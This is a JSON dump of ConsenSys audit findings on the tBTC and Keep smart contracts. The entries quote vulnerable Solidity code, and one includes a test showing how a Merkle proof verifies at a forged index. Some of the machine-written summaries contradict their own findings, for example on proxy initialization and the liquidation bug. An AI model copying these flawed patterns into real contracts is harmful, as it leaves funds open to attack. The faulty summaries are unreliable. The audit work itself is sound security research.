After each iteration, `_idx` is decremented by `_idx /= 2`.\n\n\nBecause `verifyHash256Merkle` makes no requirements on the size of `_proof` relative to `_index`, it is possible to pass in invalid values for `_index` that prove a transaction’s existence in multiple locations in the tree.\n\n\n#### Examples\n\n\nBy modifying existing tests, we showed that any transaction can be proven to exist at least one alternate index. This alternate index is calculated as `(2 ** treeHeight) + prevIndex` - though other alternate indices are possible. The modified test is below:\n\n\n\n```\nit('verifies a bitcoin merkle root', async () => {\r\n  for (let i = 0; i < verifyHash256Merkle.length; i += 1) {\r\n    const res = await instance.verifyHash256Merkle(\r\n      verifyHash256Merkle[i].input.proof,\r\n      verifyHash256Merkle[i].input.index\r\n    ); // 0-indexed\r\n    assert.strictEqual(res, verifyHash256Merkle[i].output);\r\n\r\n    // Now, attempt to use the same proof to verify the same leaf at\r\n    // a different index in the tree:\r\n    let pLen = verifyHash256Merkle[i].input.proof.length;\r\n    let height = ((pLen - 2) / 64) - 2;\r\n\r\n    // Only attempt to verify roots that are meant to be verified\r\n    if (verifyHash256Merkle[i].output && height >= 1) {\r\n      let altIdx = (2 ** height) + verifyHash256Merkle[i].input.index;\r\n\r\n      const resNext = await instance.verifyHash256Merkle(\r\n        verifyHash256Merkle[i].input.proof,\r\n        altIdx\r\n      );\r\n\r\n      assert.strictEqual(resNext, verifyHash256Merkle[i].output);\r\n\r\n      console.log('Verified transaction twice!');\r\n    }\r\n  }\r\n});\r\n\n```\n#### Recommendation\n\n\nUse the length of `_proof` to determine the maximum allowed `_index`. `_index` should satisfy the following criterion: `_index < 2 ** (_proof.length.div(32) - 2)`.\n\n\nNote that subtraction by 2 accounts for the transaction hash and merkle root, which are assumed to be encoded in the proof along with the intermediate nodes.",
      "summary": "\nThis bug report is about the `BTCUtils.verifyHash256Merkle` function used by the `ValidateSPV.prove` to validate a transaction’s existence in a Bitcoin block. The function accepts two inputs, `_proof` and `_index`. The `_proof` consists of the transaction hash, a list of intermediate nodes, and the merkle root. It performs an iterative proof process where the `_index` is used to determine whether the next proof element represents a “left branch” or a “right branch”.\n\nThe bug is that because `verifyHash256Merkle` makes no requirements on the size of `_proof` relative to `_index`, it is possible to pass in invalid values for `_index` that prove a transaction’s existence in multiple locations in the tree. A modified test showed that any transaction can be proven to exist at least one alternate index. This alternate index is calculated as `(2 ** treeHeight) + prevIndex` - though other alternate indices are possible.\n\nThe resolution for this bug is to use the length of `_proof` to determine the maximum allowed `_index`. `_index` should satisfy the following criterion: `_index < 2 ** (_proof.length.div(32) - 2)`. Subtraction by 2 accounts for the transaction hash and merkle root, which are assumed to be encoded in the proof along with the intermediate nodes.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13789",
      "title": "tbtc - liquidationInitiator can block purchaseSignerBondsAtAuction indefinitely ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/tbtc/issues/503> and commits from [keep-network/tbtc#524](https://github.com/keep-network/tbtc/pull/524) switching from `transfer` to `send`.\n\n\n#### Description\n\n\nWhen reporting a fraudulent proof the deposits `liquidationInitiator` is set to the entity reporting and proofing the fraud. The deposit that is in a `*_liquidation_in_progress` state can be bought by anyone at an auction calling `purchaseSignerBondsAtAuction`.\n\n\nInstead of receiving a share of the funds the `liquidationInitiator` can decide to intentionally reject the funds by raising an exception causing `initiator.transfer(contractEthBalance)` to throw, blocking the auction and forcing the liquidation to fail. The deposit will stay in one of the `*_liquidation_in_progress` states.\n\n\n#### Examples\n\n\n**tbtc/implementation/contracts/deposit/DepositLiquidation.sol:L224-L276**\n\n\n\n```\n/// @notice Closes an auction and purchases the signer bonds. Payout to buyer, funder, then signers if not fraud\n/// @dev For interface, reading auctionValue will give a past value. the current is better\n/// @param \\_d deposit storage pointer\nfunction purchaseSignerBondsAtAuction(DepositUtils.Deposit storage \\_d) public {\n    bool \\_wasFraud = \\_d.inFraudLiquidationInProgress();\n    require(\\_d.inSignerLiquidation(), \"No active auction\");\n\n    \\_d.setLiquidated();\n    \\_d.logLiquidated();\n\n    // send the TBTC to the TDT holder. If the TDT holder is the Vending Machine, burn it to maintain the peg.\n    address tdtHolder = \\_d.depositOwner();\n\n    TBTCToken \\_tbtcToken = TBTCToken(\\_d.TBTCToken);\n\n    uint256 lotSizeTbtc = \\_d.lotSizeTbtc();\n    require(\\_tbtcToken.balanceOf(msg.sender) >= lotSizeTbtc, \"Not enough TBTC to cover outstanding debt\");\n\n    if(tdtHolder == \\_d.VendingMachine){\n        \\_tbtcToken.burnFrom(msg.sender, lotSizeTbtc);  // burn minimal amount to cover size\n    }\n    else{\n        \\_tbtcToken.transferFrom(msg.sender, tdtHolder, lotSizeTbtc);\n    }\n\n    // Distribute funds to auction buyer\n    uint256 \\_valueToDistribute = \\_d.auctionValue();\n    msg.sender.transfer(\\_valueToDistribute);\n\n    // Send any TBTC left to the Fee Rebate Token holder\n    \\_d.distributeFeeRebate();\n\n    // For fraud, pay remainder to the liquidation initiator.\n    // For non-fraud, split 50-50 between initiator and signers. if the transfer amount is 1,\n    // division will yield a 0 value which causes a revert; instead, \n    // we simply ignore such a tiny amount and leave some wei dust in escrow\n    uint256 contractEthBalance = address(this).balance;\n    address payable initiator = \\_d.liquidationInitiator;\n\n    if (initiator == address(0)){\n        initiator = address(0xdead);\n    }\n    if (contractEthBalance > 1) {\n        if (\\_wasFraud) {\n            initiator.transfer(contractEthBalance);\n        } else {\n            // There will always be a liquidation initiator.\n            uint256 split = contractEthBalance.div(2);\n            \\_d.pushFundsToKeepGroup(split);\n            initiator.transfer(split);\n        }\n    }\n}\n\n```\n#### Recommendation\n\n\nUse a pull vs push funds pattern or use `address.send` instead of `address.transfer` which might leave some funds locked in the contract if it fails.",
      "summary": "\nA bug was discovered in the code for the DepositLiquidation.sol contract, which allows a fraudulent proof to be reported and the deposit to be bought in an auction. The bug is that when the funds are distributed, the `liquidationInitiator` can intentionally reject the funds by raising an exception, causing the auction to fail and the deposit to stay in one of the `*_liquidation_in_progress` states. This bug was addressed by switching from `transfer` to `send` in the commits from [keep-network/tbtc#524](https://github.com/keep-network/tbtc/pull/524). \n\nThe code in question is in the function `purchaseSignerBondsAtAuction`, which is used to close the auction and purchase the signer bonds. This function sends the TBTC to the TDT holder, and then distributes funds to the auction buyer. It then sends any remaining TBTC to the Fee Rebate Token holder. Finally, if the proof is fraudulent, the remainder should be paid to the liquidation initiator. If the proof is not fraudulent, the remainder should be split 50-50 between the initiator and signers. \n\nThe bug was that if the transfer amount was 1, the division would yield a 0 value which caused a revert. To fix this, the recommendation is to use a pull vs push funds pattern or use `address.send` instead of `address.transfer`, which might leave some funds locked in the contract if it fails.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13788",
      "title": "bitcoin-spv - Bitcoin output script length is not checked in wpkhSpendSighash  Won't Fix",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nSumma opted not to make this change. See <https://github.com/summa-tx/bitcoin-spv/issues/112> for details.\n\n\n#### Description\n\n\n`CheckBitcoinSigs.wpkhSpendSighash` calculates the sighash of a Bitcoin transaction. Among its parameters, it accepts `bytes memory _outpoint`, which is a 36-byte UTXO id consisting of a 32-byte transaction hash and a 4-byte output index.\n\n\nThe function in question should not accept an `_outpoint` that is not 36-bytes, but no length check is made:\n\n\n**bitcoin-spv/solidity/contracts/CheckBitcoinSigs.sol:L130-L159**\n\n\n\n```\nfunction wpkhSpendSighash(\n    bytes memory \\_outpoint,  // 36 byte UTXO id\n    bytes20 \\_inputPKH,       // 20 byte hash160\n    bytes8 \\_inputValue,      // 8-byte LE\n    bytes8 \\_outputValue,     // 8-byte LE\n    bytes memory \\_outputScript    // lenght-prefixed output script\n) internal pure returns (bytes32) {\n    // Fixes elements to easily make a 1-in 1-out sighash digest\n    // Does not support timelocks\n    bytes memory \\_scriptCode = abi.encodePacked(\n        hex\"1976a914\",  // length, dup, hash160, pkh\\_length\n        \\_inputPKH,\n        hex\"88ac\");  // equal, checksig\n    bytes32 \\_hashOutputs = abi.encodePacked(\n        \\_outputValue,  // 8-byte LE\n        \\_outputScript).hash256();\n    bytes memory \\_sighashPreimage = abi.encodePacked(\n        hex\"01000000\",  // version\n        \\_outpoint.hash256(),  // hashPrevouts\n        hex\"8cb9012517c817fead650287d61bdd9c68803b6bf9c64133dcab3e65b5a50cb9\",  // hashSequence(00000000)\n        \\_outpoint,  // outpoint\n        \\_scriptCode,  // p2wpkh script code\n        \\_inputValue,  // value of the input in 8-byte LE\n        hex\"00000000\",  // input nSequence\n        \\_hashOutputs,  // hash of the single output\n        hex\"00000000\",  // nLockTime\n        hex\"01000000\"  // SIGHASH\\_ALL\n    );\n    return \\_sighashPreimage.hash256();\n}\n\n```\n#### Recommendation\n\n\nCheck that `_outpoint.length` is 36.",
      "summary": "\nThis bug report relates to a function in the Summa Bitcoin-SPV project called `CheckBitcoinSigs.wpkhSpendSighash`. This function is used to calculate the sighash of a Bitcoin transaction and it accepts a parameter called `bytes memory _outpoint` which is a 36-byte UTXO id consisting of a 32-byte transaction hash and a 4-byte output index. However, no length check is made to ensure that `_outpoint` is actually 36-bytes, which could lead to issues with the calculation of the sighash. \n\nThe recommendation given in the report is to add a length check to ensure that `_outpoint.length` is 36. Summa opted not to make this change and more information can be found in the GitHub issue <https://github.com/summa-tx/bitcoin-spv/issues/112>.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13787",
      "title": "tbtc - provideFundingECDSAFraudProof attempts to burn non-existent funds ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed as <https://github.com/keep-network/tbtc/issues/502> and fixed with [keep-network/tbtc#523](https://github.com/keep-network/tbtc/pull/523).\n\n\n#### Description\n\n\nThe funding flow was recently changed from requiring the funder to provide a bond that stays in the Deposit contract to forwarding the funds to the keep, paying for the keep setup.\n\n\n\n> \n> So at a high level, the funding bond was designed to ensure that funders had some minimum skin in the game, so that DoSing signers/the system was expensive. The upside was that we could refund it in happy paths. Now that we’ve realized that opening the keep itself will cost enough to prevent DoS, the concept of refunding goes away entirely. We definitely missed cleaning up the funder handling in provideFundingECDSAFraudProof though.\n> \n> \n> \n\n\n#### Examples\n\n\n**tbtc/implementation/contracts/deposit/DepositFunding.sol:L170-L173**\n\n\n\n```\n// If the funding timeout has elapsed, punish the funder too!\nif (block.timestamp > \\_d.fundingProofTimerStart + TBTCConstants.getFundingTimeout()) {\n    address(0).transfer(address(this).balance);  // Burn it all down (fire emoji)\n    \\_d.setFailedSetup();\n\n```\n#### Recommendation\n\n\nRemove the line that attempts to punish the funder by burning the Deposit contract balance which is zero due to recent changes in how the payment provided with `createNewDeposit`is handled.",
      "summary": "\nThis bug report is about the funding flow of the Keep Network’s tBTC protocol. The flow was recently changed from requiring the funder to provide a bond that stays in the Deposit contract to forwarding the funds to the keep, paying for the keep setup. The bug was addressed as <https://github.com/keep-network/tbtc/issues/502> and fixed with [keep-network/tbtc#523](https://github.com/keep-network/tbtc/pull/523). \n\nThe recommendation was to remove the line that attempts to punish the funder by burning the Deposit contract balance which is zero due to recent changes in how the payment provided with `createNewDeposit` is handled. The line of code in question is found in tbtc/implementation/contracts/deposit/DepositFunding.sol:L170-L173. \n\nOverall, the bug report is about the recent changes in the funding flow of the Keep Network’s tBTC protocol and the recommendation to remove the line that attempts to punish the funder by burning the Deposit contract balance. The bug was addressed and fixed with the given link.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13786",
      "title": "keep-tecdsa - keep cannot be closed if a members bond was seized or fully reassigned ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Description\n\n\nA keep cannot be closed if the bonds have been completely reassigned or seized before, leaving at least one member with zero `lockedBonds`. In this case `closeKeep()` will throw in `freeMembersBonds()` because the requirement in `keepBonding.freeBond` is not satisfied anymore (`lockedBonds[bondID] > 0`). As a result of this, none of the potentially remaining bonds (reassign) are freed, the keep stays active even though it should be closed.\n\n\n#### Examples\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeep.sol:L373-L396**\n\n\n\n```\n/// @notice Closes keep when owner decides that they no longer need it.\n/// Releases bonds to the keep members. Keep can be closed only when\n/// there is no signing in progress or requested signing process has timed out.\n/// @dev The function can be called by the owner of the keep and only is the\n/// keep has not been closed already.\nfunction closeKeep() external onlyOwner onlyWhenActive {\n    require(\n        !isSigningInProgress() || hasSigningTimedOut(),\n        \"Requested signing has not timed out yet\"\n    );\n\n    isActive = false;\n\n    freeMembersBonds();\n\n    emit KeepClosed();\n}\n\n/// @notice Returns bonds to the keep members.\nfunction freeMembersBonds() internal {\n    for (uint256 i = 0; i < members.length; i++) {\n        keepBonding.freeBond(members[i], uint256(address(this)));\n    }\n}\n\n```\n**keep-tecdsa/solidity/contracts/KeepBonding.sol:L173-L190**\n\n\n\n```\n/// @notice Releases the bond and moves the bond value to the operator's\n/// unbounded value pool.\n/// @dev Function requires that caller is the holder of the bond which is\n/// being released.\n/// @param operator Address of the bonded operator.\n/// @param referenceID Reference ID of the bond.\nfunction freeBond(address operator, uint256 referenceID) public {\n    address holder = msg.sender;\n    bytes32 bondID = keccak256(\n        abi.encodePacked(operator, holder, referenceID)\n    );\n\n    require(lockedBonds[bondID] > 0, \"Bond not found\");\n\n    uint256 amount = lockedBonds[bondID];\n    lockedBonds[bondID] = 0;\n    unbondedValue[operator] = amount;\n}\n\n```\n#### Recommendation\n\n\nMake sure the keep can be set to an end-state (closed/inactive) indicating its end-of-life even if the bond has been seized before. Avoid throwing an exception when freeing member bonds to avoid blocking the unlocking of bonds.",
      "summary": "\nThis bug report is about an issue with closing a keep in a Solidity smart contract. The keep cannot be closed if the bonds have been completely reassigned or seized before, leaving at least one member with zero `lockedBonds`. In this case, the function `closeKeep()` will throw an exception in `freeMembersBonds()` because the requirement in `keepBonding.freeBond` is not satisfied anymore (`lockedBonds[bondID] > 0`). As a result, none of the potentially remaining bonds (reassign) are freed, and the keep stays active even though it should be closed.\n\nThe recommended solution is to make sure the keep can be set to an end-state (closed/inactive) indicating its end-of-life even if the bond has been seized before. Additionally, an exception should be avoided when freeing member bonds to avoid blocking the unlocking of bonds.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13785",
      "title": "tbtc - Inconsistency between increaseRedemptionFee and provideRedemptionProof may create un-provable redemptions ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#522](https://github.com/keep-network/tbtc/pull/522)\n\n\n#### Description\n\n\n`DepositRedemption.increaseRedemptionFee` is used by signers to approve a signable bitcoin transaction with a higher fee, in case the network is congested and miners are not approving the lower-fee transaction.\n\n\nFee increases can be performed every 4 hours:\n\n\n**tbtc/implementation/contracts/deposit/DepositRedemption.sol:L225**\n\n\n\n```\nrequire(block.timestamp >= \\_d.withdrawalRequestTime + TBTCConstants.getIncreaseFeeTimer(), \"Fee increase not yet permitted\");\n\n```\nIn addition, each increase must increment the fee by exactly the initial proposed fee:\n\n\n**tbtc/implementation/contracts/deposit/DepositRedemption.sol:L260-L263**\n\n\n\n```\n// Check that we're incrementing the fee by exactly the redeemer's initial fee\nuint256 \\_previousOutputValue = DepositUtils.bytes8LEToUint(\\_previousOutputValueBytes);\n\\_newOutputValue = DepositUtils.bytes8LEToUint(\\_newOutputValueBytes);\nrequire(\\_previousOutputValue.sub(\\_newOutputValue) == \\_d.initialRedemptionFee, \"Not an allowed fee step\");\n\n```\nOutside of these two restrictions, there is no limit to the number of times `increaseRedemptionFee` can be called. Over a 20-hour period, for example, `increaseRedemptionFee` could be called 5 times, increasing the fee to `initialRedemptionFee * 5`. Over a 24-hour period, `increaseRedemptionFee` could be called 6 times, increasing the fee to `initialRedemptionFee * 6`.\n\n\nEventually, it is expected that a transaction will be submitted and mined. At this point, anyone can call `DepositRedemption.provideRedemptionProof`, finalizing the redemption process and rewarding the signers. However, `provideRedemptionProof` will fail if the transaction fee is too high:\n\n\n**tbtc/implementation/contracts/deposit/DepositRedemption.sol:L308**\n\n\n\n```\nrequire((\\_d.utxoSize().sub(\\_fundingOutputValue)) <= \\_d.initialRedemptionFee \\* 5, \"Fee unexpectedly very high\");\n\n```\nIn the case that `increaseRedemptionFee` is called 6 times and the signers provide a signature for this transaction, the transaction can be submitted and mined but `provideRedemptionProof` for this will always fail. Eventually, a redemption proof timeout will trigger the deposit into liquidation and the signers will be punished.\n\n\n#### Recommendation\n\n\nBecause it is difficult to say with certainty that a 5x fee increase will always ensure a transaction’s redeemability, the upper bound on fee bumps should be removed from `provideRedemptionProof`.\n\n\nThis should be implemented in tandem with <https://github.com/ConsenSys/thesis-tbtc-audit-2020-01/issues/38,> so that signers cannot provide a proof that bypasses `increaseRedemptionFee` flow to spend the highest fee possible.",
      "summary": "\nA bug was identified in the DepositRedemption.increaseRedemptionFee function of the tBTC protocol. This function is used by signers to approve a signable Bitcoin transaction with a higher fee, in case the network is congested and miners are not approving the lower-fee transaction. The bug is that there is no limit to the number of times `increaseRedemptionFee` can be called, meaning over a 24-hour period the fee can be increased up to 6 times. If a transaction is submitted and mined with this higher fee, the `provideRedemptionProof` function will fail and the signers will be punished.\n\nThe recommendation is to remove the upper bound on fee bumps from `provideRedemptionProof` and to implement this in tandem with another issue, so that signers cannot provide a proof that bypasses `increaseRedemptionFee` flow to spend the highest fee possible. This will help to ensure that signers are not punished for submitting transactions with a fee that is too high.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13784",
      "title": "keep-core - TokenGrant and TokenStaking allow staking zero amount of tokens and front-running ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nAddressed with <https://github.com/keep-network/keep-core/issues/1425> and [keep-network/keep-core#1461](https://github.com/keep-network/keep-core/pull/1461) by requiring a hardcoded minimum amount of tokens to be staked.\n \n\n#### Description\n\n\nTokens are staked via the callback `receiveApproval()` which is normally invoked when calling `approveAndCall()`. The method is not restricting who can initiate the staking of tokens and relies on the fact that the token transfer to the `TokenStaking` contract is pre-approved by the owner, otherwise, the call would revert.\n\n\nHowever, `receiveApproval()` allows the staking of a zero amount of tokens. The only check performed on the number of tokens transferred is, that the token holders balance covers the amount to be transferred. This check is both relatively weak - having enough balance does not imply that tokens are approved for transfer - and does not cover the fact that someone can call the method with a zero amount of tokens.\n\n\nThis way someone could create an arbitrary number of operators staking no tokens at all. This passes the token balance check, `token.transferFrom()` will succeed and an operator struct with a zero stake and arbitrary values for `operator, from, magpie, authorizer` can be set. Finally, an event is emitted for a zero stake.\n\n\nAn attacker could front-run calls to `receiveApproval` to block staking of a legitimate operator by creating a zero stake entry for the operator before she is able to. This vector might allow someone to permanently inconvenience an operator’s address. To recover from this situation one could be forced to `cancelStake` terminating the zero stake struct in order to call the contract with the correct stake again.\n\n\nThe same issue exists for `TokenGrant`.\n\n\n#### Examples\n\n\n**keep-core/contracts/solidity/contracts/TokenStaking.sol:L54-L81**\n\n\n\n```\n/\\*\\*\n \\* @notice Receives approval of token transfer and stakes the approved amount.\n \\* @dev Makes sure provided token contract is the same one linked to this contract.\n \\* @param \\_from The owner of the tokens who approved them to transfer.\n \\* @param \\_value Approved amount for the transfer and stake.\n \\* @param \\_token Token contract address.\n \\* @param \\_extraData Data for stake delegation. This byte array must have the\n \\* following values concatenated: Magpie address (20 bytes) where the rewards for participation\n \\* are sent, operator's (20 bytes) address, authorizer (20 bytes) address.\n \\*/\nfunction receiveApproval(address \\_from, uint256 \\_value, address \\_token, bytes memory \\_extraData) public {\n    require(ERC20Burnable(\\_token) == token, \"Token contract must be the same one linked to this contract.\");\n    require(\\_value <= token.balanceOf(\\_from), \"Sender must have enough tokens.\");\n    require(\\_extraData.length == 60, \"Stake delegation data must be provided.\");\n\n    address payable magpie = address(uint160(\\_extraData.toAddress(0)));\n    address operator = \\_extraData.toAddress(20);\n    require(operators[operator].owner == address(0), \"Operator address is already in use.\");\n    address authorizer = \\_extraData.toAddress(40);\n\n    // Transfer tokens to this contract.\n    token.transferFrom(\\_from, address(this), \\_value);\n\n    operators[operator] = Operator(\\_value, block.number, 0, \\_from, magpie, authorizer);\n    ownerOperators[\\_from].push(operator);\n\n    emit Staked(operator, \\_value);\n}\n\n```\n#### Recommendation\n\n\nRequire tokens to be staked and explicitly disallow the zero amount of tokens case. The balance check can be removed.\n\n\nNote: Consider checking the calls return value or calling the contract via `SafeERC20` to support potentially broken tokens that do not revert in error cases (`token.transferFrom`).",
      "summary": "\nThis bug report concerns a flaw in the `TokenStaking` contract, which allows someone to stake a zero amount of tokens. The method `receiveApproval()`, which is normally invoked when calling `approveAndCall()`, does not restrict who can initiate the staking of tokens and only checks that the token holders balance covers the amount to be transferred. This weak check does not cover the fact that someone can call the method with a zero amount of tokens, allowing an attacker to create an arbitrary number of operators staking no tokens at all. This could be used to permanently inconvenience an operator’s address.\n\nThe same issue exists for `TokenGrant`. The recommendation is to require tokens to be staked and explicitly disallow the zero amount of tokens case. The balance check can be removed. Additionally, it is suggested to check the calls return value or calling the contract via `SafeERC20` to support potentially broken tokens that do not revert in error cases (`token.transferFrom`). The bug was addressed with <https://github.com/keep-network/keep-core/issues/1425> and [keep-network/keep-core#1461](https://github.com/keep-network/keep-core/pull/1461) by requiring a hardcoded minimum amount of tokens to be staked.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13783",
      "title": "keep-tecdsa - If caller sends more than is contained in the signer subsidy pool, the value is burned ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/keep-ecdsa#306](https://github.com/keep-network/keep-ecdsa/pull/306). The `subsidyPool` was removed in favor of a `reseedPool`, which is filled by the beacon by surplus sent to `requestRelayEntry`.\n\n\n#### Description\n\n\nThe signer subsidy pool in `BondedECDSAKeepFactory` tracks funds sent to the contract. Each time a keep is opened, the subsidy pool is intended to be distributed to the members of the new keep:\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeepFactory.sol:L312-L320**\n\n\n\n```\n// If subsidy pool is non-empty, distribute the value to signers but\n// never distribute more than the payment for opening a keep.\nuint256 signerSubsidy = subsidyPool < msg.value\n    ? subsidyPool\n    : msg.value;\nif (signerSubsidy > 0) {\n    subsidyPool -= signerSubsidy;\n    keep.distributeETHToMembers.value(signerSubsidy)();\n}\n\n```\nThe tracking around subsidy pool increases is inconsistent, and can lead to sent value being burned. In the case that `subsidyPool` contains less Ether than is sent in `msg.value`, `msg.value` is unused and remains in the contract. It may or may not be added to `subsidyPool`, depending on the return status of the random beacon:\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeepFactory.sol:L347-L357**\n\n\n\n```\n(bool success, ) = address(randomBeacon).call.gas(400000).value(msg.value)(\n    abi.encodeWithSignature(\n        \"requestRelayEntry(address,string,uint256)\",\n        address(this),\n        \"setGroupSelectionSeed(uint256)\",\n        callbackGas\n    )\n);\nif (!success) {\n    subsidyPool += msg.value; // beacon is busy\n}\n\n```\n#### Recommendation\n\n\nRather than tracking the `subsidyPool` individually, simply distribute `this.balance` to each new keep’s members.",
      "summary": "\nThe bug report is about the signer subsidy pool in the BondedECDSAKeepFactory contract which is used to track funds sent to the contract. The tracking around the subsidy pool was found to be inconsistent and could lead to sent value being burned. To fix this issue, the recommendation was to simply distribute the contract's balance to each new keep's members rather than tracking the subsidy pool individually. The issue was addressed in the keep-network/keep-ecdsa#306 pull request where the `subsidyPool` was removed in favor of a `reseedPool`, which is filled by the beacon by surplus sent to `requestRelayEntry`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13782",
      "title": "Initialize implementations for proxy contracts and protect initialization methods ✓ Addressed",
      "impact": "MEDIUM",
      "content": "#### Resolution\n\n\n\nThis issue is addressed with the following changesets that ensure that the logic contracts cannot be used by other parties by initializing them in the constructor: <https://github.com/keep-network/keep-tecdsa/issues/297,> <https://github.com/keep-network/keep-core/issues/1424,> and <https://github.com/keep-network/tbtc/issues/500>.\n\n\n#### Description\n\n\nIt should be avoided that the implementation for proxy contracts can be initialized by third parties. This can be the case if the `initialize` function is unprotected. Since the implementation contract is not meant to be used directly without a proxy delegate-calling it is recommended to protect the initialization method of the implementation by initializing on deployment.\n\n\nChanging the proxies implementation (`upgradeTo()`) to a version that does not protect the initialization method may allow someone to front-run and initialize the contract if it is not done within the same transaction.\n\n\n#### Examples\n\n\n* `KeepVendor` delegates to `KeepVendorImplV1`. The implementations initialization method is unprotected.\n\n\n**keep-tecdsa/solidity/contracts/BondedECDSAKeepVendorImplV1.sol:L22-L32**\n\n\n\n```\n/// @notice Initializes Keep Vendor contract implementation.\n/// @param registryAddress Keep registry contract linked to this contract.\nfunction initialize(\n    address registryAddress\n)\n    public\n{\n    require(!initialized(), \"Contract is already initialized.\");\n    \\_initialized[\"BondedECDSAKeepVendorImplV1\"] = true;\n    registry = Registry(registryAddress);\n}\n\n```\n* `KeepRandomBeaconServiceImplV1` and `KeepRandomBeaconServiceUpgradeExample`\n\n\n**keep-core/contracts/solidity/contracts/KeepRandomBeaconServiceImplV1.sol:L118-L137**\n\n\n\n```\nfunction initialize(\n    uint256 priceFeedEstimate,\n    uint256 fluctuationMargin,\n    uint256 dkgContributionMargin,\n    uint256 withdrawalDelay,\n    address registry\n)\n    public\n{\n    require(!initialized(), \"Contract is already initialized.\");\n    \\_initialized[\"KeepRandomBeaconServiceImplV1\"] = true;\n    \\_priceFeedEstimate = priceFeedEstimate;\n    \\_fluctuationMargin = fluctuationMargin;\n    \\_dkgContributionMargin = dkgContributionMargin;\n    \\_withdrawalDelay = withdrawalDelay;\n    \\_pendingWithdrawal = 0;\n    \\_previousEntry = \\_beaconSeed;\n    \\_registry = registry;\n    \\_baseCallbackGas = 18845;\n}\n\n```\n* `Deposit` is deployed via `cloneFactory` delegating to a `masterDepositAddress` in `DepositFactory`. The `masterDepositAddress` (`Deposit`) might be left uninitialized.\n\n\n**tbtc/implementation/contracts/system/DepositFactoryAuthority.sol:L3-L14**\n\n\n\n```\ncontract DepositFactoryAuthority {\n\n    bool internal \\_initialized = false;\n    address internal \\_depositFactory;\n\n    /// @notice Set the address of the System contract on contract initialization\n    function initialize(address \\_factory) public {\n        require(! \\_initialized, \"Factory can only be initialized once.\");\n\n        \\_depositFactory = \\_factory;\n        \\_initialized = true;\n    }\n\n```\n#### Recommendation\n\n\nInitialize unprotected implementation contracts in the implementation’s constructor. Protect initialization methods from being called by unauthorized parties or ensure that deployment of the proxy and initialization is performed in the same transaction.",
      "summary": "\nA bug was reported in the Keep Network, which is a platform for privacy-preserving and censorship-resistant services. The issue was that the implementation for proxy contracts could be initialized by third parties, which could lead to front-running and initialization of the contract if it is not done within the same transaction.\n\nTo address this issue, the Keep Network changed the proxies implementation to a version that does not protect the initialization method. They also recommended that unprotected implementation contracts should be initialized in the implementation’s constructor, and that the deployment of the proxy and initialization should be done in the same transaction to protect it from being called by unauthorized parties.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13781",
      "title": "Consistent use of SafeERC20 for external tokens ✓ Addressed",
      "impact": "MEDIUM",
